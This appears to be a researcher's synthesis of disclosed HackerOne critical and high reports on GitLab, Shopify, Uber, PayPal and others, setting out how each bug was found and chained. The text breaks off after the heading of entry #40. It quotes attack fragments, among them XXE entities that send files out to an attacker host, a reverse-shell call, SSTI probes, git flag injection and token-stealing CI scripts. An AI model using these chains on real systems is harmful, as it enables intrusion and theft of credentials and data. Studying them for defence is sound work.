# Disclosed HackerOne crit/high reports — 51 read in full (report JSON + team summaries)

Method: read `hackerone.com/reports/<id>.json` (full body + team/researcher summaries) for each; candidate set from `reddelexc/hackerone-reports` `docs/tops_100/TOP100PAID.md` and `docs/tops_by_bug_type/{TOPOAUTH,TOPWEBCACHE,TOPBUSINESSLOGIC}.md`. No requests to any program asset. 7 picked ids returned 404 on the `.json` path (1406938 Dropbox, 2281075 Teleport, 1312641 Pornhub, 1089467 New Relic, 868436 Mail.ru, 492841 Postmates, 312543-OK/838635-OK — the 404s are excluded, not reported).

**Warning up front:** FIRST SIGNAL is the field H1 reports hide most. Many bodies are `"visibility":"no-content"` / `"vulnerability_information":""` — only a team summary is public. I mark those **REDACTED**. ~55% of the set does not state what made the hunter look; the ones that do are the valuable part of the synthesis.

---

## A. RCE / code injection

**1. https://hackerone.com/reports/3782701** · 2026-08-05 · Mozilla Taskcluster (CI SaaS) · Critical · $12,000
Stack: Node 24.15.0, `/graphql`, `sift` 17.1.3, k8s pod, Auth0/GitHub OAuth, PostgreSQL.
FIRST SIGNAL: not stated as a trigger; earliest concrete item = GraphQL `filter` argument, "a free-form JSON object". Flagged `submitted_with_assistant: true`.
Mechanic: user `filter` JSON reaches `sift(filter)` unvalidated; sift compiles string `$where` via `new Function` because `CSP_ENABLED` unset.
Chain: A no `Authorization` header → `credentials.js` calls `next()`, request proceeds anonymous → B anonymous role holds `auth:expand-scopes`, so `scopes:["assume:anonymous"]` makes upstream return non-empty array (needed so sift iterates) → C `{"$where":"<js>"}` executes per element → D error text returned to client via `formatError.js` = output channel → E `process.getBuiltinModule("child_process").execSync()`.
Impact proof: marker `"RCE_42_object"` (6*7 + typeof process); `id` → `uid=1000(node) gid=1000(node)`; `cat /etc/passwd`; env dump naming `TASKCLUSTER_ACCESS_TOKEN`, `READ_DB_URL`, `DB_CRYPTO_KEYS`, `PULSE_PASSWORD`, `SESSION_SECRET=FIXME`; values withheld, offered SHA-256 fingerprints. Confirmed on both firefox-ci-tc and community-tc.
Defense fail: no input validation ("Nothing is stripped or validated"); sift's CSP guard would have thrown but was not enabled; unauth requests allowed through.
Tags: GraphQL, code-injection, RCE.

**2. https://hackerone.com/reports/1679624** · 2022-10-06 · GitLab (DevOps SaaS) · Critical 9.9 · $33,510 · CVE-2022-2884
Stack: GitLab 15.3.1-ee, Ruby 2.7.5, sawyer 0.9.2, redis-rb 4.4.0, Sidekiq.
FIRST SIGNAL (stated, best-in-set): he read GitLab's **own patch for the previous bug** — "This is very similar to" the 15.3.1 advisory, and the patch "added validation to `Gitlab::Cache::Import::Caching` but there is another spot" = `repository_importer.rb#L55`.
Mechanic: attacker-controlled `Sawyer::Resource` (`default_branch`) whose JSON keys override `to_s`/`bytesize` makes redis-rb emit a RESP frame with wrong declared length → Redis command injection.
Chain: A authenticated user starts GitHub import against attacker's `github_hostname` → B fake API returns `default_branch` with mismatched `to_s`/`bytesize` → C flows `change_head`→`branch_exists?`→`redis_set_cache.try_include?`, smuggles `set session:gitlab:<id>` holding a Marshal gadget → D request with `_gitlab_session=<id>` → `Marshal.load` → exec.
Impact proof: strace of the Redis socket showing injected `set session:gitlab:jjjj` with gadget `echo id > /tmp/vakzz22`; exception log `comparison of String with 0 failed` at `set_cache.rb:60`; PoC `fake_server3.py`, `gen_payload3.rb`. Command output itself not shown.
Defense fail: prior CVE fix was patched at one call site only.
Tags: incomplete-patch, deserialization, RCE.

**3. https://hackerone.com/reports/1154542** · 2021-05-14 · GitLab · Critical · $20,000
Stack: GitLab 13.10.2-ee, Workhorse (Go), ExifTool (Perl) v11.70 `DjVu.pm`, puma 5.1.1.
FIRST SIGNAL: Workhorse source `exif.go#L104` — it "passes any files with the extensions [jpg|jpeg|tiff]" to ExifTool; hunter's insight: "ExifTool will ignore the file extension and try to determine what the file is based on the content".
Mechanic: ExifTool DjVu annotation parsing runs tokens through Perl `eval`; escaping check misses backslash+newline.
Chain: A upload DjVu renamed `.jpg` via snippet "Attach a file" → B ExifTool content-sniffs to DjVu module → C Copyright annotation closes the string with `\`+newline and appends `qx{...}` → shell as `git`.
Impact proof: local `echo_vakzz.jpg` creates `/tmp/vakzz`; on production `https://gitlab.com/-/snippets/new` a reverse shell: `id` → `uid=500(git)`, `hostname -a` → `web-09-sv-gprd`, `ps auxww` showing `TCPSocket.new("103.3.61.137",12345)`.
Defense fail: extension allowlist is not a format check; `-all=` tag-strip happens after parse; DjVu escape validation incomplete.
Tags: file-upload, dependency-RCE.

**4. https://hackerone.com/reports/658013** · 2019-12-19 · GitLab · Critical · $12,000
FIRST SIGNAL: Search API `wiki_blobs` scope "can be provided with an arbitrary `ref` parameter"; how he got there NOT STATED.
Mechanic: `ref` reaches the `git log` argv unsanitized, so `--`-prefixed values parse as git options (flag injection).
Chain: A wiki commit message = attacker content (an SSH pubkey) → B `search?scope=wiki_blobs&search=page&ref=--output=/tmp/file` → arbitrary file write as `git` → C target `/var/opt/gitlab/.ssh/authorized_keys` → SSH.
Impact proof: `cat /tmp/file` showing controlled content; `ssh git@gitlab-vm.local -i gitlab` then `id` → `uid=998(git)`; overwritten authorized_keys shown with injected `ssh-rsa`.
Defense fail: no `--end-of-options`/`--` separator, no ref validation.
Tags: argument-injection, file-write→RCE.

**5. https://hackerone.com/reports/125980** · 2016-04-06 · Uber (rider.uber.com) · severity NOT STATED · $10,000
FIRST SIGNAL (classic): set profile name to `{{ '7'*7 }}`; the **notification email** "Your Uber account information has been updated" from support@uber.com rendered `7777777`.
Mechanic: profile name evaluated as Jinja2 when the email template is built (inferred from output; no code shown).
Chain: A profile name field → B template eval in mail → C `{{ [].__class__.__base__.__subclasses__() }}`, `{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}` → D full RCE claimed, not achieved ("there is a length limit").
Impact proof: email screenshots, class enumeration output. No command exec.
Defense fail: only a length limit; blocked the long payload, not evaluation.
Tags: SSTI, out-of-band render channel.

**6. https://hackerone.com/reports/925585** · 2021-02-09 · PayPal (fintech) · Critical 10.0 · $30,000 — **body REDACTED (empty)**
Mechanic: internal npm package names resolved against the public registry; names unclaimed → anyone can publish them.
Chain: A publish the internal names publicly → B internal builds install them → C code exec in dev env. Name-discovery method NOT STATED (external write-up: "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies").
Impact proof: PayPal: researcher "observed they were downloaded". No payload/callback detail.
Tags: supply-chain, dependency-confusion.

## B. SSRF → infrastructure credentials

**7. https://hackerone.com/reports/341876** · 2018-05-23 · Shopify (e-commerce SaaS) · team Medium 6.9, paid at Core-RCE level · $25,000
FIRST SIGNAL: the Exchange app's **screenshot feature** — a server-side renderer he could point at a URL.
Mechanic: SSRF to GCE metadata via a renderer, then metadata concealment not enabled.
Chain: A edit own store's `password.liquid` to send the browser to metadata → B install Exchange; its screenshot captures the metadata response as an image → key detail: the older `/v1beta1` endpoint "does not require the `Metadata-Flavor: Google` header", and `alt=json` renders more → C leaked SA token is useless for SSH (403, no Compute perms) → D dump `kube-env` → Kubelet CA cert + client cert + key → E kubelet creds can list/create pods but not exec, `get secrets` denied; **describing a pod revealed a secret's name** → fetch that secret → SA token → F `kubectl exec` → `id` = `uid=0(root)`.
Impact proof: root `id` output in containers.
Defense fail: metadata concealment off; legacy metadata endpoint without the header requirement; RBAC blocked `get secrets` but pod description leaked the name.
Tags: SSRF, cloud-metadata, k8s, chain-of-6.

**8. https://hackerone.com/reports/2262382** · 2023-12-08 · HackerOne (bug-bounty SaaS) · Critical 10.0 · $25,000
Stack: Rails (`ApplicationController.new.render_to_string`), HTML→PDF library (unnamed), AWS.
FIRST SIGNAL: PoC **redacted**; the only observable is the fallback error string `"Missing template for element: #{element[:template]}"` — report does not say it was the trigger.
Mechanic: attacker-controlled `element[:template]` reflected unescaped into the error branch HTML, which is then fed to a server-side PDF renderer.
Chain: A request a PDF analytics report with element type `'template'` → B `template_path(element)` misses → raw value into `html_without_layout` = HTML injection, injected tag was "an `<iframe>`" → C renderer fetches it server-side → SSRF to internal AWS → temporary credentials.
Impact proof: researcher "able to access *AWS Credentials*"; team confirms internal AWS + temp creds; team praised "stopping at the right point in testing". Artifacts redacted.
Defense fail: template allowlist existed — the injection lived in the **lookup-failure branch**, which skipped sanitization.
Tags: HTML-injection→SSRF, PDF-renderer.

**9. https://hackerone.com/reports/2301565** · 2024-01-30 · HackerOne · Medium 4.9 · $2,500 (included as the near-miss control case)
FIRST SIGNAL (stated): "I noticed that there is no filter enabled for IPV6 IP addresses with IPv6 address mapped to IPv4."
Chain: A org webhook URL → attacker PHP page → B page returns `header("Location: http://[::ffff:a9fe:a9fe]")` → C "Test request" → server follows → response visible in webhook logs.
Impact proof: webhook log shows header `server: EC2ws`. **No metadata contents** → stayed Medium. This is exactly the Low/Info ceiling: same class as #7/#8, 10x–100x less bounty, because nothing was read.
Defense fail: "anti ssrf rules" existed but did not normalize IPv4-mapped IPv6; redirect target re-validation NOT STATED.
Tags: SSRF, encoding-normalization.

**10. https://hackerone.com/reports/826361** · 2020-06-07 · GitLab · High · $10,000
Stack: GitLab 12.8.7-ee, Ruby 2.6.5, **CarrierWave 1.3.1**, Prometheus/Alertmanager on localhost.
FIRST SIGNAL: source line in the Note model `mount_uploader :attachment, AttachmentUploader` — library knowledge: CarrierWave's mount auto-creates a `remote_attachment_url=` setter.
Mechanic: project-import AttributeCleaner did not strip CarrierWave's `remote_*_url` setters → `Kernel.open(@uri)` server-side GET.
Chain: A craft `project.json` note hash with `remote_attachment_url` → B import → `uploader.download!` fetches arbitrary URL → C **response saved as the note attachment** = full-read SSRF, viewable in your own project.
Impact proof: live import on gitlab.com fetching postbin, note link `gitlab.com/wbowling/ssrf1/-/issues/1#note_309127303`, screenshot + `ssrf-note.mp4`. Metadata/Redis-RCE described only.
Defense fail: setter not blacklisted; `AvatarUploader` elsewhere checks file type and would have blocked viewing — `AttachmentUploader` on Notes did not.
Tags: SSRF, import-format, convention-knowledge.

**11. https://hackerone.com/reports/549882** · 2019-12-13 · Vimeo · Critical 9.0 · bounty paid, amount NOT STATED — **body REDACTED**
Only: "Using our upload feature, the user was able to force an SSRF"; title claims internal GCP data incl. SSH keys. Mechanic/steps NOT STATED. External write-up cited (medium.com/@dPhoeniixx).
Tags: SSRF, upload-fetcher.

**12. https://hackerone.com/reports/312543** · 2018-03-13 · Semrush (SEO SaaS) · Critical · bounty paid, amount NOT STATED
FIRST SIGNAL: Site Audit option "Enter sitemap URL" — a user-supplied URL "downloaded and processed by a Java XML processor"; confirmation was an inbound hit in his own log: `"GET /text.txt HTTP/1.1" 302 - "-" "Java/1.8.0_144"` (crawler UA `SemrushBot-SA/0.97`).
Chain: A attacker-hosted XML parsed → B OOB entity `<!ENTITY xxe SYSTEM "http://xxe.webhooks.pw/text.txt">` proves external entities resolve → C param entity `<!ENTITY % goodies SYSTEM "file:///etc/hostname">` + external `combine.dtd` defining `<!ENTITY xxe "%goodies;">` → D value placed in `<loc>http://location.webhooks.pw/resp/&xxe;</loc>`; the crawler then **requests that loc** → exfil over the crawler's own fetch.
Impact proof: attacker-server logs from `46.229.173.66` with `GET /resp/███` plus a "Decoded:" section; `/etc/hostname` captured; `file:///home/` directory listing (`cdh`, `lost found`); 1-min GIF `semrush_xxe3.gif`.
Defense fail: none described — DTD processing left on.
Tags: XXE, OOB-exfil-via-crawler.

## C. Arbitrary file read / path traversal

**13. https://hackerone.com/reports/1439593** · 2022-03-21 · GitLab · Critical 9.6 · $29,000
FIRST SIGNAL: source `lib/bulk_imports/common/pipelines/uploads_pipeline.rb`, line `untar_zxf(archive: File.join(tmp_dir, FILENAME), dir: tmp_dir)` followed by `Dir.glob(...'**','*')`; plus an implicit **differential against the other import path** — "Symlinks should be removed similar to the project import".
Chain: A importable group pointed at attacker-controlled source URL (Flask proxy + ngrok) swapping in `uploads.tar.gz` with `ln -s /etc/passwd ./<upload-secret>/passwd` → B the symlink sits in a directory named with a **real 32-hex upload secret lifted from his own milestone attachment**, so it passes `extract_dynamic_path` → C `load` does `File.open(file_path,'r')`, follows the symlink, `UploadService` stores content as a group upload → read via `/-/uploads/<secret>/passwd`.
Impact proof: on gitlab.com, `/etc/passwd` containing `git:x:1000:1000:GitLab,,,:/home/git:/bin/bash`; then `/srv/gitlab/config/secrets.yml` → `secret_key_base`, `otp_key_base`, `db_key_base`, `openid_connect_signing_key`, `ci_jwt_signing_key`.
Defense fail: `untar_zxf` "only changes the permissions"; `File.directory?` check and dynamic-path match don't catch symlinks-to-files; the project-import symlink strip was never applied to this pipeline.
Tags: path-traversal, symlink, import, differential-between-two-code-paths.

**14. https://hackerone.com/reports/827052** · 2020-04-27 · GitLab · Critical · $20,000
FIRST SIGNAL: the reference regex, specifically the permissive group — `MARKDOWN_PATTERN = %r{\!?\[.*?\]\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\)}`; "there is no restriction on what `file` can be".
Chain: A issue description `![a](/uploads/1111…1111/../../../../../etc/passwd)` → B **move the issue** → `UploadsRewriter`→`find_file`→`retrieve_from_store!(file)` → C `file.try(:exists?)` passes, `copy_to(file, target_parent)` copies the server file into the target project → read it there.
Impact proof: `/etc/passwd` copied into the 2nd project; video `file-read.mp4`.
Defense fail: secret is strictly `[0-9a-f]{32}` but filename is `.*?`; the existence check actually confirms the target exists.
Tags: path-traversal, markdown-filter.

## D. Account takeover / auth bypass / identity confusion

**15. https://hackerone.com/reports/2293343** · disclosed 2025-02-26 (submitted 2023-12-20) · GitLab · Critical 10.0 · $35,000
FIRST SIGNAL: NOT STATED; only observable is `"user[email]":"victim@gmail.com"` in the intercepted reset POST.
Mechanic: reset handler accepted an **array** where it expected a scalar, and mailed the link to every address.
Chain: A "Forgot Your Password?" with victim email → B Burp "Content-Type Converter → Convert to JSON" → C `"user":{"email":["victim@gmail.com","attacker@gmail.com"]}` → same reset link to both → D set password, log in.
Impact proof: reset mail received at attacker address, password changed, logged in as victim. No attachments.
Defense fail: no scalar-type enforcement once the body is JSON.
Tags: ATO, type-confusion, content-type-swap. **This is a two-mutation move (content-type swap + param→array) on the single most boring endpoint in the app.**

**16. https://hackerone.com/reports/976603** · 2021-04-15 · Superhuman/Grammarly (SaaS) · High · $10,500
Mechanic: SAML signature verified against `trim(issuer)` while org assignment uses the untrimmed `entityId`, and the trailing-space entity "is always prioritized".
FIRST SIGNAL: the observation that you can "authenticate against one SSO instance, but have you get added to a completely separate one"; concrete trigger = a new org whose `entityId` is the victim's "**except** with a space ` ` at the end".
Chain: A register org with victim `entityId`+space, own keypair → B ~2 min propagation; victim's users authenticate but route to attacker org → SSO DoS → C new/removed users get provisioned into attacker org **even though signed by the victim IdP key**; existing accounts must click "join" → D attacker changes `entityId`, logs in as victim with own keypair; converted personal accounts expose personal docs.
Impact proof: repro steps only, no attachments; full zero-interaction ATO not shown ("I'm not sure if it's possible to get this with zero user interaction").
Defense fail: signature check used a normalized issuer, placement used the raw one; no uniqueness check on the normalized value.
Tags: SAML, whitespace-normalization, identity-confusion.

**17. https://hackerone.com/reports/922456** · 2020-10-01 · GitLab (as IdP) · High · $3,000
FIRST SIGNAL: the interstitial text itself — "Verify the email address in your account profile before you sign in." He then replayed the underlying form POST.
Chain: A seed victim on laravelshift.com via GitHub/Bitbucket with email X → B register unconfirmed GitLab account with email X → C "Sign in with GitLab" is blocked at the consent page → D POST `/oauth/authorize` directly with cookies, `authenticity_token`, `client_id`, `redirect_uri=https%3A%2F%2Flaravelshift.com%2Fauth%2Fgitlab%2Fcallback`, `state`, `response_type=code` → 302 with `code` → E RP merges by email → ATO on the third party.
Impact proof: ATO on a victim account he seeded on a real RP.
Defense fail: verification enforced **only on the consent page**, not in the POST handler; RPs "assuming GitLab is properly checking validated emails".
Tags: OAuth, UI-only-gate, cross-system trust.

**18. https://hackerone.com/reports/202781** · 2019-01-25 · Uber · High · bounty paid, amount NOT STATED
Mechanic: FB OAuth app allowed any `https://auth.uber.com/login?*` as `redirect_uri`, and Uber's own endpoints then forwarded the token out.
Chain: A wildcard lets him append `next_url` → B `next_url=https://login.uber.com/logout`, which "would redirect based on the Referer header" → C Referer-based redirect delivers the victim + FB token to attacker site. Single-URL PoC.
Impact proof: team says it "would have allowed for a full account takeover"; actual takeover not stated.
Defense fail: allowlist ended in `?*`; the gadget was two of Uber's own redirectors.
Tags: OAuth, open-redirect-chain. **Open redirect alone pays ~0; as the token exfil hop it is High.**

**19. https://hackerone.com/reports/861940** · 2020-06-18 · Semrush · Medium 6.4 · bounty paid, amount NOT STATED
FIRST SIGNAL: the `redirect_uri` on `oauth.semrush.com` with `client_id=seoquake`, tested with accented hosts.
Mechanic: server-side validation maps homoglyph hosts (`sémrush.com`, `šemrush.com`, `sèmrûsh.com`) onto `semrush.com`; browser resolves the punycode `oauth.xn--emrush-9jb.com` instead ("somehow not idempotent").
Impact proof: PoC URL; code "will be sent to oauth.šemrush.com"; evidence redacted; **code never exchanged** → Medium.
Tags: OAuth, IDN/unicode normalization.

**20. https://hackerone.com/reports/534450** · 2019-12-03 · Superhuman/Grammarly · High 8.2 · bounty paid, amount NOT STATED
FIRST SIGNAL (two-stage, and the best "don't close the thread" case in the set): his **own previously rejected report #532553** — "An endpoint at gnar.grammarly.com called \"/cookies\" allows us to set or get any cookie value we want", rejected with "this is how cookies are supposed to work". He kept going and found the cookie "gets reflected on the \"www.grammarly.com\" in src attribute of an img tag" — and that the exploitable copy was the one "surrounded with noscript tags".
Chain: A cross-origin credentialed POST `gnar.grammarly.com/cookies?name=gnar_containerId&value=<payload closing </noscript> + external script>` → B victim redirected to `www.grammarly.com/upgrade?...` where it reflects unencoded → XSS in grammarly.com origin → C from that origin, GET `gnar.grammarly.com/cookies?name=grauth`, read response, exfil → session theft.
Impact proof: stole `grauth` of a test account; webserver logs `"GET /?cookie={██████}"` with referrer `https://www.grammarly.com/`; `Grammarly_Takeover_POC.mp4`; tested Chrome 73 / Firefox 60.6.1esr.
Defense fail: HttpOnly/Secure bypassed because /cookies **returns** values; SOP/CORS bypassed because the read happens from the victim origin; the first `img` copy "is encoded and not exploitable" — the `noscript` copy was not; /cookies had no Referer check and no cookie allow/deny list.
Tags: XSS, cookie-injection, ATO, two-host chain.

**21. https://hackerone.com/reports/745324** · 2019-12-03 · HackerOne · High 8.3, paid as critical · $20,000
FIRST SIGNAL: a HackerOne analyst pasted a live session cookie into a reply on his earlier report — "you are gevi me your session on last report"; H1: "parts of a cURL command, copied from a browser console, were not removed".
Chain: A credential disclosure in a comment → B reuse in another client (no IP/device binding) → C Security Analyst access: HAS Inbox, Triage Inbox, Inbox, Report View across that analyst's programs.
Impact proof: claim "i can read all reports @security and more program"; evidence redacted; H1's own investigation confirmed three features used to view titles, metadata, some full contents; GraphQL queries traced.
Defense fail: high-entropy cookies, strict CSP, MFA SSO — all irrelevant once the cookie is handed over; IP binding deliberately skipped (mobile/proxy users); "This was a known risk."
Tags: session-reuse, leaked-credential.

**22. https://hackerone.com/reports/173551** · 2017-05-17 · Uber · Critical · $10,000 — **body REDACTED**
Mechanic: reset token returned in the HTTP response of the reset request. Chain: know email → start reset → read token from response → reset. Proof NOT STATED.
Tags: ATO, token-in-response.

**23. https://hackerone.com/reports/739737** · 2020-01-08 · PayPal · High 8.0 · $15,300 — **body empty; team summary only**
Mechanic: security-challenge tokens "being leaked in a JS file used by the recaptcha implementation" (XSSI), and the challenge endpoint did not prevent third-party token reuse.
Chain: A victim on attacker site, XSSI reads the challenge token → B victim clicks a login link and authenticates; CAPTCHA required after auth → C attacker POSTs the CAPTCHA solve with the stolen token → triggers the "authentication request replay" → victim's email + **plaintext password** returned. Proof NOT STATED. Fix: controls against token reuse.
Tags: XSSI, auth-replay, credential-disclosure.

**24. https://hackerone.com/reports/2443228** · 2024-07-13 · TikTok · Critical 9.4 · $12,000 — **REDACTED (`no-content`)**
Only: account-recovery endpoint with "improper parameter handling" / "improper authentication mechanism"; ATO "by knowing the account username"; affected Android; scope `*.tiktokv.com`. Mechanic, parameter, endpoint, proof all NOT STATED. Mechanic not extractable.

**25. https://hackerone.com/reports/1328546** · 2022-02-23 · TikTok Ads · Critical · $15,000 — **REDACTED**
Only: "JWT (JSON Web Token) was not verified properly" on an "intelbot service"; summary also mentions "authentication bypass and site wide stored XSS". How the pieces connect: NOT STATED. Not extractable.

**26. https://hackerone.com/reports/1901040** · 2023-04-20 · GitHub · High · $10,000 · CVE-2023-23761 — **body `no-content`**
Mechanic: "a missed check in the gist.github.com authentication flow" — gist SSH path trusted a CA-signed cert's claimed login. Chain: A issue a cert via the SSH CA feature → B set extension `login@github.com=<victim username>` → C gist.github.com authenticates as victim → push to any user's gists (vendor: needed to know the secret gist URL). Proof NOT STATED. The specific missing check NOT STATED.
Tags: SSH-cert, authz, one-surface-missed-check.

**27. https://hackerone.com/reports/3713965** · 2026-07-15 · GitHub · Medium · bounty paid, amount NOT STATED · CVE-2026-9106 — **body empty**
Mechanic: OAuth consent screen omitted the `manage_runners:org` scope ("A UI misrepresentation vulnerability"). Chain: A app requests `manage_runners:org` → B victim authorizes, scope not displayed → C access to org runner management. Proof NOT STATED.
Tags: OAuth, consent-UI. Included as a *Medium* data point: a scope/consent defect with no demonstrated takeover stays Medium.

**28. https://hackerone.com/reports/740989** · 2019-12-11 · Shopify (Stocky app) · Medium · bounty paid, amount NOT STATED
FIRST SIGNAL (pure flow observation): he "noticed that a staff member without Apps permission was able to access the Stocky app".
Mechanic: Stocky granted access "at the start of the OAuth process rather than the end" → Shopify called it "a full authentication bypass". Proof: only that the unprivileged staff member got in — no data shown, hence Medium despite the words "full authentication bypass".
Tags: OAuth, authz. **Lesson: an authentication bypass with no data read is rated by the proof, not by the label.**

## E. Authorization / IDOR / tenant isolation

**29. https://hackerone.com/reports/3862641** · disclosed 2026-10-01 · HackerOne · Critical · $15,000 · `submitted_with_assistant: true`
FIRST SIGNAL: hunter's body blank; the team summary's observable is a 422 "You do not have the appropriate access" **that still carried data in `context.subject`**.
Chain: A free low-priv account at `hackerone.com/vdp-sign-up` → B pick other programs' report ids (test reports listed at `hackerone.com/security?type=team`) → C `POST /reports/[ID]/reference.json` body `{}` with own session cookie + `X-Csrf-Token` → D read private report data from `context.subject` of the 422.
Impact proof: team's repro uses approved test reports that "contain flags to include in your POC"; hunter's own PoC not published.
Defense fail: the authz check existed and "correctly rejected unauthorized access with an HTTP 422" — **it blocked the action but serialized the object into the error context**. CSRF token was satisfied with the attacker's own.
Tags: IDOR, error-object-serialization. **The denial response was the leak.**

**30. https://hackerone.com/reports/1618347** · disclosed 2025-01-21 (submitted 2022-06-28) · HackerOne · Critical 9.3 · $25,000
FIRST SIGNAL: only "Just a recent update gives the results of private programs" — the trigger artifact NOT STATED.
Chain: A unauthenticated GraphQL `node(id:)` with a hand-built gid ending `PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287` requesting `... on PolicyPageAssetGroupDocument{id,name}` → B response returns the private program's asset `name` → C enumerate ids → program names, scope details, report titles.
Impact proof: one request "Without authorization" returning a populated (redacted) `name`.
Defense fail: NOT STATED (node resolver had no per-type authorization).
Tags: GraphQL, Relay global-id enumeration, unauth.

**31. https://hackerone.com/reports/2032716** · 2023-07-04 · HackerOne · High 8.3 · $12,500
FIRST SIGNAL: clicked the edit pen in the collaborators panel while capturing traffic — "you will see the user email in first request"; the field is `"username_or_email"` inside `"operationName":"SaveCollaboratorsMutation"`.
Chain: A dummy report → B invite **any** hacker by username (cap: "Max is only 2 invites per report"), target stays pending → C reopen the editor; the mutation (`report_id`, `collaborators[]`, `bounty_weight`) carries the target's private email.
Impact proof: sample request with values redacted; claimed the email of "todayisnew , Hacker 1 rank in H1"; video PoC (link redacted).
Defense fail: emails are private and collaboration requires acceptance — the email was handed out **while the invite was still pending**, so acceptance never gated anything.
Tags: GraphQL, IDOR-by-design-flow, PII.

**32. https://hackerone.com/reports/1819832** · 2023-03-06 · Snapchat · High · $15,000
FIRST SIGNAL: two observables placed together — "In delete request there is parameter of id" and the **public share URL** `https://story.snapchat.com/spotlight/█████` containing the same id.
Chain: A delete own post at my.snapchat.com/myposts, capture `operationName: DeleteStorySnaps`, `storyType: SPOTLIGHT_STORY` in Burp → B swap `ids` for another user's video id → "the video of other user will get delete".
Impact proof: stated video PoC; no attachment present in the disclosed data.
Defense fail: only authentication; no ownership check (inference, not stated).
Tags: IDOR, GraphQL mutation, destructive.

**33. https://hackerone.com/reports/3124517** · 2025-09-23 · GitHub Enterprise Server · High · $10,000 · CVE-2025-8447 — **body `no-content`**
Mechanic (team summary): diff/compare between a repo you can access and a private repo you cannot returns the private repo's code.
Chain: A access to any repo on the instance → B know the private repo name + a branch/tag/commit SHA → C trigger compare/diff → leaked code. Endpoints/params/proof NOT STATED.
Tags: IDOR, cross-repo authz, diff-as-oracle.

**34. https://hackerone.com/reports/415081** · 2019-07-30 · PayPal · High 7.1 · $10,500 — **body empty**
Only: `/businessmanage/users/api/v1/users` let a business owner "assign secondary users from other accounts", who "would be granted access to the login". Steps/params/proof NOT STATED.
Tags: IDOR, multi-tenant.

**35. https://hackerone.com/reports/689314** · 2019-11-27 · GitLab · Critical · $12,000
FIRST SIGNAL: source review of `ee/app/controllers/ee/projects_controller.rb`, permitted params `use_custom_template` and `group_with_project_templates_id` (+ CE's `template_name`) — parameters you would never see in normal traffic.
Chain: A `validate_namespace_used_with_template` begins `return unless project.group`, so creating the project in a **personal namespace** skips the descendant check and the attacker-supplied group id survives → B `available_custom_project_templates` returns `::Project.where(namespace_id: group_id)`; `ProjectsFinder` filters by visibility only and "does **not** check the access level of the user", so a public project with members-only repo/issues/snippets is selectable → C `custom_template.add_export_job` under `CustomTemplateExportImportStrategy`; the Sidekiq export worker assumes authorization → import into attacker's project.
Impact proof: 2-account PoC (public project with features set to "Only Project Members"; attacker intercepts `POST /projects` and sets the three params); minutes later repo, confidential issues, private snippets, MRs, pipelines present. Real-world: screenshot of a "Redacted copy of `gitlab-com/finance`".
Defense fail: namespace check only for group namespaces; finder checks visibility not per-feature access; no authz inside the job (+ TOCTOU noted).
Tags: authz, hidden-params, feature-level-vs-project-level permissions.

**36. https://hackerone.com/reports/509924** · 2019-04-20 · GitLab · Critical 9.1 · $12,000
FIRST SIGNAL: the JSON response of `/:namespace/:project/notes` after a quick action — it contains `commands_changes.target_project` with `"runners_token"` and `"runners_token_encrypted"`.
Chain: A comment `/move <full path of any other project>` in your own issue → B interpreter resolves the target project without access control and serializes the whole model → plaintext + encrypted runner tokens → C register a runner on the victim project → secret CI variables, arbitrary code into their environment (described, not performed).
Impact proof: redacted real gitlab.com response for a private project (`"visibility_level": 0`) with `"runners_token": "mzssqx69THU██████████"`; note the response also said `"valid": false` — **the action failed and the data leaked anyway**.
Tags: over-serialization, authz, quick-actions.

**37. https://hackerone.com/reports/446585** · 2019-03-05 · GitLab · Critical 9.9 · $11,000
FIRST SIGNAL: "When looking into this feature" (import); the exploited observable is `"template":false` inside the `services` array of the exported `project.json`.
Chain: A edit your own export and flip `"template":true` with any service `type` → B import creates an **instance-wide** service template (admin-only normally) → C `create_services_from_active_templates` runs `Service.where(template: true, active: true)` and installs it into **every project created afterwards, across all users** → D payload by service: `EmailsOnPushService` mails commit diffs out, `HipchatService` exfils issues/notes/MRs incl. confidential, `MockCiService` is hidden from the UI and calls an attacker URL, `ExternalWikiService`/`CustomIssueTrackerService` re-point links.
Impact proof: PoC tar injecting a `MockCiService` template; a second user creates a project and exports it — the new `project.json` "will contain the service created for the other project". Slack mutation "not confirmed". Side finding: import also sets admin-only `custom_attributes`.
Tags: import-trusts-flags, privilege-escalation, persistence.

**38. https://hackerone.com/reports/894569** · 2020-08-26 · GitLab · Critical 9.6 · $12,000
FIRST SIGNAL: NOT STATED ("This is only my recent research").
Chain: A attacker1 public repo `poc` with harmless `.gitlab-ci.yml` → B attacker2 creates group `test`, sets a **pull mirror** of attacker1's repo with "Trigger pipelines for mirror updates", invites victim as `Owner`, then **deletes the attacker2 account** → C attacker1 rewrites `.gitlab-ci.yml`; ~30 min later the mirror update starts a pipeline and "The triggerer of the pipeline will be the *Victim user*" → `$CI_JOB_TOKEN` carries victim access.
Impact proof: CI script `git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/victim/private_repo_name.git`, `ls -lah .`, `cat README.md`. No captured output/attachments. Impact: "stealing the CI_JOB_TOKEN of any user".
Tags: business-logic, orphaned-ownership, 3-identity + 30-min setup.

**39. https://hackerone.com/reports/300305** · 2018-02-07 · Shopify Partners · Critical 10.0 · $15,250
FIRST SIGNAL (read-other-people's-reports): **Shopify's public summary of report #270981**, which said a collaborator request "could be accepted automatically," "with the user account converted into a collaborator account" — he reproduced that and attacked the automatic conversion.
Chain (TOCTOU): A set partner email to an attacker-owned address, save the confirmation link **without opening it** → B submit an email change to the victim staff member's address (that request takes "1,100 - 2,500 ms") → C a few ms later open the saved link in another tab → an arbitrary email is confirmed → D add the store under `/[ID]/managed_stores` → the employee's staff account auto-converts to a collaborator on the attacker's dashboard, no merchant involvement = store takeover.
Impact proof: partner account `698396` showing `cache@hackerone.com` confirmed — an address he "would never be able to validate otherwise"; store takeover on his own test store/employee; honest gap: "maybe not necessary I didn't test".
Defense fail: email change and confirmation not in one transaction / no row lock; collaborator conversion needed no merchant approval. Fix: locking + admin approval for every collaborator request; first fix in 12 hours.
Tags: race-condition, email-verification-bypass, business-logic.

**40. https://hackerone.com/reports/1330529** · 2022-02-22 · Eternal/Zomato (marketplace) · Critical 9.1 · $3,250
